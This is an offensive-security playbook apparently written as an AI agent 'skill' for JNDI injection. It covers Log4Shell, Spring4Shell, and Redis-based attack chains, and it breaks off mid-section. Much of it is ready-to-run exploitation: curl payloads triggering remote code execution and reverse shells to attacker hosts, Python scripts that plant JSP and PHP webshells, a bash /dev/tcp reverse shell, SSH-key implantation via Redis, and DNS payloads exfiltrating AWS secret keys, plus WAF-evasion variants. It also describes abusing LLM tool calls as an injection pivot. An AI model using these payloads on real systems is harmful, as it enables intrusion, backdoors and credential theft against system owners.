---
name: jndi-injection
description: >-
  JNDI injection playbook. Use when Java applications perform JNDI lookups with attacker-controlled names, especially via Log4j2, Spring, or any code path reaching InitialContext.lookup().
---

# SKILL: JNDI Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert JNDI injection techniques. Covers lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets. Base models often confuse JNDI injection with general deserialization — this file clarifies the distinct attack surface.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation

---

## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://test-attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://test-attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://test-attacker.com/");
// JVM downloads http://test-attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://test-attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://test-attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://test-attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://test-attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname test-attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://test-attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://test-attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://test-attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://test-attacker.com/x}
${j${::-n}di:ldap://test-attacker.com/x}
${jndi:l${lower:D}ap://test-attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://test-attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://test-attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://test-attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```

---

## 9. 2026 EMERGING TECHNIQUES

> Post-Log4Shell the industry widely disabled remote class loading and JNDI lookup, but bypasses keep evolving. The 2026 landscape shifts toward **local classpath gadgets, parser-layer deserialization, and ML-serving JNDI sinks**.

### 9.1 Local Classpath Gadget (No `trustURLCodebase` Required)

When `com.sun.jndi.ldap.object.trustURLCodebase=false` (default since 8u191), remote class loading is blocked — but the attacker's LDAP server can still return a `Reference` whose `javaFactory` points to a class **already on the victim classpath**. No remote codebase needed; the factory only has to implement `javax.naming.spi.ObjectFactory` and accept attacker-controlled properties.

```ldif
# Attacker LDAP entry — factory resolved from local classpath
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory    # Tomcat on classpath
javaReferenceAddress: #0:forceString#String#x=eval,#1:x#String#Runtime.getRuntime().exec("id")
```

Common 2026 reusable factories observed on real application classpaths:

| Factory (classpath) | Effect |
|---|---|
| `org.apache.naming.factory.BeanFactory` (Tomcat) | Bean property → EL/SpEL eval |
| `com.zaxxer.hikari.HikariJNDIFactory` (HikariCP) | JDBC URL injection → `jdbc:h2:mem` RCE |
| `org.apache.commons.configuration2.JNDIConfiguration` | Forced config + expression eval |
| App-specific `*DataSourceFactory` | DataSource `url`/`driver` overwrite → JDBC RCE |

### 9.2 Fastjson Three-Layer Bypass (July 2026, in-the-wild)

Fastjson ≤ 1.2.83 chains three behaviors to reach a JNDI lookup **without ever calling `checkAutoType`**:

1. `TypeUtils.castToJavaBean()` reads `@type` **unconditionally** when the target is `java.lang.Class`.
2. `java.lang.Class` is in the pre-approved deserializers list → skips the autoType blacklist.
3. `MiscCodec` for `Class` types calls `TypeUtils.loadClass()` directly — no `checkAutoType` on the resolved class.

The chain is split across **two requests** (cross-link [deserialization-insecure](../deserialization-insecure/SKILL.md)):

```json
// Request 1 — prime the cache with the JNDI gadget class
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}

// Request 2 — trigger the JNDI lookup on the cached class
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test-attacker.com:1389/Exploit","autoCommit":true}
```

`JdbcRowSetImpl.connect()` then calls `InitialContext.lookup(dataSourceName)`. Observed in the wild against Spring Boot + Fastjson API gateways.

### 9.3 JNDI in ML / LLM Serving Infrastructure (2026)

Java-based inference wrappers expose JNDI sinks that traditional AppSec rarely audits:

- **Triton Server Java wrapper** — model config endpoints accept `naming:` URIs forwarded to `InitialContext.lookup()`.
- **Spring Boot ML serving** — `spring.cloud.config.uri` / dynamic `DataSource` JNDI names from model metadata.
- **LLM tool-calling** — when an agent resolves a tool whose `endpoint` argument is a `jndi:`/`ldap:` URL:

```json
{"tool":"file_reader","args":{"path":"ldap://test-attacker.com:1389/Exploit"}}
```

If the tool host performs `ctx.lookup(path)`, the LLM becomes a JNDI injection pivot. Audit every tool whose argument reaches a Java naming context.

### 9.4 JNDI over HTTP/3 (QUIC) — WAF Bypass

Most WAFs inspect TCP/HTTP/1.1 and HTTP/2 streams only. Delivering the JNDI URL over HTTP/3 (QUIC, UDP/443) slips past signature rules that match `ldap://` / `${jndi:` in request bodies:

```text
Log4Shell payload carried in an HTTP/3 header on a QUIC-only API gateway:
:method: POST
:scheme: https
:path: /api/v1/search
user-agent: ${jndi:ldap://test-attacker.com:1389/x}
# WAF inline on TCP/443 only → QUIC traffic uninspected
```

Mitigation requires HTTP/3-aware inspection or blocking QUIC at the edge.

### 9.5 JDK Version Drift (2026)

| JDK | JNDI posture |
|---|---|
| **21+ (LTS 21/25)** | `com.sun.jndi.ldap.object.trustURLCodebase` hardcoded `false`; RMI registry deserialization filter stricter |
| **17** | Legacy default; many orgs still pin here |
| **8 / 11** | Still widely deployed in legacy + ML serving containers — **full bypass surface applies** |

RMI Registry JEP 290 filter bypass (2026): when an allow-listed gadget chain (a class permitted by the existing `serial-filter`) is reachable, attackers reuse it to deserialize into a JNDI reference without tripping the deny-list. Enumerate the deployed `jdk.serialFilter` and hunt permitted-chain gadgets rather than fighting the deny-list.

### 9.6 2026 JNDI Testing Checklist

```
□ Confirm sink reachable: ${jndi:dns://TOKEN.collab.net}
□ Exfiltrate JDK: ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
□ JDK 8/11 → full bypass surface (remote + local gadget + BeanFactory)
□ JDK 17 → local classpath factory + serialized gadget
□ JDK 21+ → serialized gadget + allow-listed RMI chain only
□ Enumerate classpath factories (Tomcat, HikariCP, app DataSourceFactory)
□ Test Fastjson two-request Class→JdbcRowSetImpl chain
□ Send JNDI URL over HTTP/3 (QUIC) to bypass TCP-only WAF
□ Audit ML serving: Triton Java wrapper, Spring Boot ML, LLM tool args
□ Log4Shell obfuscation still bypasses 2026 WAF rules: ${${lower:j}ndi:...}
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 5 条完整、可即用的实战攻击链，覆盖 2026 年真实场景。所有命令均以授权渗透测试为前提。

### 攻击链 1：Log4Shell（CVE-2021-44228）完整利用链（JNDIExploit）

**场景**：目标运行存在漏洞的 Log4j2 版本（2.0-beta9 至 2.14.1），任何被日志记录的用户输入都可能触发 JNDI 注入。使用 JNDIExploit 工具一站式完成利用。

**CVE 参考**：CVE-2021-44228（Log4Shell），CVSS 10.0，2026 年仍有大量未更新系统受影响。

**步骤 1：确认 Log4Shell 漏洞（DNS 探测）**

```bash
# 使用 DNSLog 确认漏洞（最安全的探测方式）
# 获取一个 DNSLog 域名: xxx.dnslog.cn

# 在所有可能的注入点发送探测 payload
# HTTP Header 注入
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://xxx.dnslog.cn/a}" \
  -H "X-Forwarded-For: \${jndi:ldap://xxx.dnslog.cn/b}" \
  -H "Referer: \${jndi:ldap://xxx.dnslog.cn/c}" \
  -H "X-Api-Version: \${jndi:ldap://xxx.dnslog.cn/d}" \
  -H "Accept-Language: \${jndi:ldap://xxx.dnslog.cn/e}"

# URL 参数注入
curl -i "http://target.com/search?q=\${jndi:ldap://xxx.dnslog.cn/f}"

# POST body 注入
curl -i -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"\${jndi:ldap://xxx.dnslog.cn/g}","password":"x"}'

# 检查 DNSLog 是否收到 DNS 查询 → 确认漏洞
```

**步骤 2：获取目标 JDK 版本（决定利用路径）**

```bash
# 通过 DNS 外带 JDK 版本信息
# ${sys:java.version} 是 Log4j 的内置 lookup
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://\${sys:java.version}.xxx.dnslog.cn/a}"

# DNS 查询: 11.0.13.xxx.dnslog.cn → JDK 版本 11.0.13
# 也外带其他系统信息
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://\${sys:java.version}.\${sys:os.name}.\${hostName}.xxx.dnslog.cn/a}"
# DNS 查询: 11.0.13.Linux.target-server.xxx.dnslog.cn
```

**步骤 3：搭建 JNDIExploit 利用工具**

```bash
# 下载 JNDIExploit（一站式 JNDI 利用工具）
# 支持多种利用方式: LDAP + 远程类加载 / 序列化 gadget / BeanFactory
git clone https://github.com/feihong-cs/JNDIExploit.git
cd JNDIExploit
mvn clean package -DskipTests

# 或直接下载预编译 jar
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.3/JNDIExploit.v1.3.zip
unzip JNDIExploit.v1.3.zip

# 启动 JNDIExploit（监听 LDAP 1389 + HTTP 8888）
java -jar JNDIExploit-1.3.jar -i attacker.com -p 8888

# 输出可用 payload 列表:
# [+] LDAP: ldap://attacker.com:1389/Basic/Command/base64/[command]
# [+] LDAP: ldap://attacker.com:1389/Basic/ReverseShell/ip/port
# [+] LDAP: ldap://attacker.com:1389/Basic/TomcatEcho
# [+] LDAP: ldap://attacker.com:1389/Basic/SpringEcho
```

**步骤 4：触发 RCE（JDK < 8u191，远程类加载）**

```bash
# 方式 1: 执行命令（base64 编码）
# 命令: id
# base64: aWQ=
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/Command/base64/aWQ=}"

# 方式 2: 反弹 shell
# JNDIExploit 自动生成反弹 shell payload
# 目标会连接 attacker.com:4444
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/ReverseShell/attacker.com/4444}"

# 攻击者侧监听
nc -lvnp 4444

# 方式 3: 命令回显（TomcatEcho - 在 HTTP 响应中返回命令输出）
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/TomcatEcho}" \
  -H "cmd: id"
# 响应中包含 id 命令的输出
```

**步骤 5：JDK >= 8u191 的绕过（本地 gadget）**

```bash
# 远程类加载被禁止后，使用本地 classpath gadget
# 前提: 目标 classpath 有 Tomcat（BeanFactory）或 CommonsCollections

# JNDIExploit 自动选择合适的 gadget
# Tomcat BeanFactory + EL 注入（无需远程类加载）
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/TomcatBypass/Command/base64/aWQ=}"

# 或使用 ysoserial 序列化 gadget（需要 CommonsCollections 在 classpath）
# 启动 ysoserial JRMPListener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"

# 目标 payload 指向 RMI
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:rmi://attacker.com:1099/Exploit}"
```

**步骤 6：WAF 绕过变体**

```bash
# WAF 拦截 ${jndi:...} → 使用 Log4j lookup 混淆

# 大小写混淆
curl -i http://target.com/ \
  -H "User-Agent: \${\${lower:j}ndi:ldap://attacker.com:1389/Basic/Command/base64/aWQ=}"

# 字符拆分
curl -i http://target.com/ \
  -H "User-Agent: \${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://attacker.com:1389/x}"

# 环境变量默认值
curl -i http://target.com/ \
  -H "User-Agent: \${\${env:NaN:-j}ndi:ldap://attacker.com:1389/x}"

# upper + lower 组合
curl -i http://target.com/ \
  -H "User-Agent: \${\${upper:j}\${upper:n}\${lower:d}\${upper:i}:ldap://attacker.com:1389/x}"

# 嵌套 lookup
curl -i http://target.com/ \
  -H "User-Agent: \${j\${::-n}di:ldap://attacker.com:1389/x}"
```

**检测规避要点**：
- DNS 探测不产生 RCE，是最安全的确认方式
- `${sys:java.version}` 外带版本信息决定利用路径
- JNDIExploit 自动适配 JDK 版本选择利用方式
- Log4j lookup 混淆绕过几乎所有基于 `${jndi:` 签名的 WAF

---

### 攻击链 2：Spring4Shell（CVE-2022-22965）类加载器操纵

**场景**：目标运行 Spring Framework 5.3.x < 5.3.18 或 5.2.x < 5.2.20，运行在 Tomcat + JDK 9+。利用 ClassLoader 操纵写入 webshell。

**CVE 参考**：CVE-2022-22965（Spring4Shell），CVSS 9.8。

**步骤 1：确认目标使用 Spring + Tomcat + JDK 9+**

```bash
# 检查响应头中的 Spring 痕迹
curl -i http://target.com/
# 响应头可能包含: X-Application-Context: application:main

# 触发错误页面确认 Tomcat
curl -i http://target.com/nonexistent
# Tomcat 错误页面包含 "Apache Tomcat"

# 检查 JDK 版本（通过错误消息或响应特征）
# Spring4Shell 需要 JDK 9+（ClassLoader.getModule 存在）
```

**步骤 2：发送 Spring4Shell payload 写入 webshell**

```bash
# payload 原理:
# Spring 参数绑定允许设置嵌套属性
# class.module.classLoader.resources.context.parent.pipeline.first.pattern
# → 操纵 Tomcat AccessLogValve 写入任意文件

curl -i -X POST http://target.com/hello/greeting \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

# URL 解码后的关键参数:
# pattern: %{c2}i if("j".equals(request.getParameter("pwd"))){ ... exec(cmd) ... } %{suffix}i
# suffix: .jsp (日志文件后缀改为 jsp)
# directory: webapps/ROOT (写入 web 根目录)
# prefix: shell (文件名为 shell.jsp)
# fileDateFormat: (空，禁用日期后缀)

# 写入的 webshell: webapps/ROOT/shell.jsp
```

**步骤 3：访问 webshell 执行命令**

```bash
# 访问写入的 webshell
# shell.jsp 接受 pwd 和 cmd 参数
curl "http://target.com/shell.jsp?pwd=j&cmd=id"
# 输出: uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)

# 执行更多命令
curl "http://target.com/shell.jsp?pwd=j&cmd=whoami"
curl "http://target.com/shell.jsp?pwd=j&cmd=cat%20/etc/passwd"
curl "http://target.com/shell.jsp?pwd=j&cmd=env"
```

**步骤 4：自动化利用脚本**

```python
# spring4shell_exploit.py - CVE-2022-22965 自动化利用
import requests
import urllib.parse

TARGET = "http://target.com"

def exploit_spring4shell():
    """
    发送 Spring4Shell payload 写入 webshell
    """
    # webshell 内容（JSP）
    shell_content = '%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i'
    
    # 参数绑定 payload
    params = {
        # 日志内容 = webshell JSP 代码
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": shell_content,
        # 日志后缀 = .jsp
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        # 日志目录 = web 根目录
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        # 日志文件名前缀
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell",
        # 禁用日期后缀
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }
    
    # 发送 payload
    r = requests.post(f"{TARGET}/hello/greeting", data=params)
    print(f"[*] Payload 发送: {r.status_code}")
    
    # 验证 webshell
    r = requests.get(f"{TARGET}/shell.jsp", params={"pwd": "j", "cmd": "id"})
    if "uid=" in r.text:
        print(f"[+] Webshell 写入成功!")
        print(f"[+] 命令输出: {r.text.strip()}")
        return True
    return False

def execute_command(cmd):
    """通过 webshell 执行命令"""
    r = requests.get(f"{TARGET}/shell.jsp", params={"pwd": "j", "cmd": cmd})
    return r.text.strip()

# 利用
if exploit_spring4shell():
    print("[*] whoami:", execute_command("whoami"))
    print("[*] 当前目录:", execute_command("pwd"))
    
    # 获取反弹 shell
    rev_shell = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
    execute_command(rev_shell)
```

**步骤 5：绕过防护（dataBinding 拦截器）**

```bash
# 某些应用添加了 dataBinding 拦截器阻止 class.module 访问
# 绕过 1: 使用 class.classLoader（不同属性路径）
curl -i -X POST http://target.com/hello/greeting \
  -d 'class.classLoader.resources.context.parent.pipeline.first.pattern=...'

# 绕过 2: 利用其他可绑定的对象属性
# 若目标有自定义 Controller 暴露了可绑定的对象
curl -i -X POST http://target.com/api/user/update \
  -d 'user.class.module.classLoader.resources.context.parent.pipeline.first.pattern=...'

# 绕过 3: 多次请求累积写入（pattern 可被追加）
# 第一次请求写入 webshell 前半部分
# 第二次请求写入后半部分
```

**检测规避要点**：
- webshell 文件名伪装为 `shell.jsp`（可改为 `.error.jsp` 等）
- pattern 中的 `%{c2}i` 是 Tomcat 日志变量，被替换为空
- 使用 `pwd` 参数保护 webshell，需知道密码才执行
- 多次小量写入绕过请求体大小限制

---

### 攻击链 3：JNDI via Redis Hessian 反序列化

**场景**：目标使用 Redis 作为缓存，暴露了未授权访问或弱密码。利用 Redis 的 Hessian 序列化触发 JNDI 注入，无需目标直接暴露 JNDI 接口。

**CVE 参考**：Redis 未授权访问 + Hessian 反序列化（CWE-502），2026 年仍常见于内网 Redis 实例。

**步骤 1：确认 Redis 未授权访问**

```bash
# 测试 Redis 未授权访问（默认 6379 端口，无密码）
redis-cli -h target.com ping
# 返回 PONG → 未授权访问确认

# 或通过nc
echo -e "PING\r\n" | nc target.com 6379
# +PONG → 确认

# 测试写入权限
redis-cli -h target.com set test_key "test_value"
redis-cli -h target.com get test_key
# 若能写入 → 可利用
```

**步骤 2：利用 Redis 写入 SSH 公钥（经典方式）**

```bash
# 生成 SSH 密钥对
ssh-keygen -t rsa -f /data/user/work/redis_rsa -N ""

# 构造 Redis 写入命令
# 将公钥写入 /root/.ssh/authorized_keys
(echo -e "\n\n"; cat /data/user/work/redis_rsa.pub; echo -e "\n\n") > /data/user/work/pub.txt

# 通过 Redis 写入
redis-cli -h target.com flushall
cat /data/user/work/pub.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dir /root/.ssh/
redis-cli -h target.com config set dbfilename authorized_keys
redis-cli -h target.com save

# SSH 登录
ssh -i /data/user/work/redis_rsa root@target.com
```

**步骤 3：利用 Redis 写入 Webshell（若有 Web 服务）**

```bash
# 探测 Web 根目录
redis-cli -h target.com config get dir
redis-cli -h target.com config get dbfilename

# 写入 PHP webshell
redis-cli -h target.com flushall
redis-cli -h target.com set shell "<?php @eval(\$_POST['cmd']);?>"
redis-cli -h target.com config set dir /var/www/html/
redis-cli -h target.com config set dbfilename shell.php
redis-cli -h target.com save

# 访问 webshell
curl -X POST http://target.com/shell.php -d "cmd=system('id');"
```

**步骤 4：Hessian 反序列化触发 JNDI（高级利用）**

```bash
# 若目标使用 Spring Data Redis + Hessian 序列化
# 可通过写入恶意 Hessian 序列化数据触发反序列化

# 构造 Hessian 反序列化 gadget（需要工具）
# 使用 marshalsec 生成 Hessian payload
java -cp marshalsec.jar marshalsec.Hessian -t JNDI -i attacker.com:1389 Exploit > /data/user/work/hessian_payload.bin

# 将 payload 写入 Redis
cat /data/user/work/hessian_payload.bin | redis-cli -h target.com -x set hessian_gadget

# 当目标应用从 Redis 读取并反序列化该数据时:
# 1. Hessian 反序列化触发 gadget 链
# 2. gadget 调用 InitialContext.lookup("ldap://attacker.com:1389/Exploit")
# 3. 加载恶意类执行命令

# 攻击者侧启动 LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit" 1389
```

**步骤 5：利用 Redis 主从复制 RCE（2026 仍有效）**

```bash
# Redis 4.x+ 支持模块加载，通过主从复制加载恶意 .so 模块

# 1. 编译恶意 Redis 模块
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make

# 2. 启动恶意 Redis 主节点
python3 redis-rogue-server.py --rhost target.com --lhost attacker.com --module=module.so
# 脚本自动完成:
# - 让目标 Redis 成为攻击者 Redis 的从节点
# - 同步恶意 .so 模块到目标
# - 目标加载模块
# - 通过模块执行命令

# 或手工操作:
redis-cli -h target.com slaveof attacker.com 6379
# 攻击者侧 Redis 加载模块并发送 FULLRESYNC
# 目标加载 module.so → 可执行任意命令
redis-cli -h target.com module load /path/to/module.so
redis-cli -h target.com system.exec "id"
```

**步骤 6：通过 JNDI 链式利用至 RCE**

```python
# redis_jndi_chain.py - Redis + JNDI 链式利用
import subprocess
import redis
import requests

TARGET_REDIS = "target.com"
ATTACKER = "attacker.com"

def redis_to_jndi_rce():
    """
    Redis 未授权 → 写入反序列化数据 → JNDI 注入 → RCE
    """
    # 1. 连接 Redis
    r = redis.Redis(host=TARGET_REDIS, port=6379)
    
    # 2. 启动攻击者 LDAP 服务（后台）
    ldap_proc = subprocess.Popen([
        "java", "-cp", "marshalsec.jar",
        "marshalsec.jndi.LDAPRefServer",
        f"http://{ATTACKER}:8888/#Exploit", "1389"
    ])
    
    # 3. 启动 HTTP 服务托管恶意类
    http_proc = subprocess.Popen([
        "python3", "-m", "http.server", "8888"
    ], cwd="/data/user/work/exploit_class")
    
    # 4. 生成 Hessian payload 并写入 Redis
    subprocess.run([
        "java", "-cp", "marshalsec.jar",
        "marshalsec.Hessian", "-t", "JNDI",
        "-i", f"{ATTACKER}:1389", "Exploit"
    ], stdout=open("/data/user/work/hessian.bin", "wb"))
    
    with open("/data/user/work/hessian.bin", "rb") as f:
        r.set("spring:session:sessions:trigger", f.read())
    
    # 5. 等待目标应用读取并触发
    print("[*] 等待目标反序列化触发 JNDI...")
    
    # 清理
    ldap_proc.terminate()
    http_proc.terminate()

redis_to_jndi_rce()
```

**检测规避要点**：
- Redis 内网暴露常被忽视，是 JNDI 的间接入口
- Hessian 序列化数据在 Redis 中以二进制存储，不易检测
- 主从复制 RCE 是 Redis 4.x+ 的通用利用方式
- 恶意 .so 模块加载后可在 Redis 进程内执行命令

---

### 攻击链 4：2026 新向量 - 现代 Java 框架中的 JNDI（Quarkus/Micronaut）

**场景**：2026 年云原生 Java 应用大量采用 Quarkus 和 Micronaut 框架。这些框架的配置注入和依赖注入机制引入新的 JNDI 注入面。

**步骤 1：识别 Quarkus/Micronaut 应用**

```bash
# Quarkus 特征
curl -i http://target.com/
# 响应头: X-Quarkus-Version: 3.x.x
# 或错误页面包含 "quarkus"

# Micronaut 特征
curl -i http://target.com/
# 响应头: X-Powered-By: Micronaut
# 或错误页面包含 "micronaut"

# 检查 actuator/health 端点
curl http://target.com/q/health   # Quarkus
curl http://target.com/health     # Micronaut
```

**步骤 2：Quarkus 配置注入 JNDI**

```bash
# Quarkus 支持 ${...} 配置占位符
# 若配置值用户可控，可注入 JNDI lookup

# 测试 Quarkus 配置端点
curl -i http://target.com/q/config  # 某些版本暴露配置

# 利用配置注入触发 JNDI
# 若应用有配置更新端点:
curl -i -X POST http://target.com/api/config/update \
  -H "Content-Type: application/json" \
  -d '{"datasource.url":"ldap://attacker.com:1389/Exploit"}'

# Quarkus 的 AgroalDataSource 在创建连接时可能触发 JNDI lookup
# 若 datasource.url 被设置为 ldap:// URL
```

**步骤 3：Micronaut 依赖注入 JNDI**

```bash
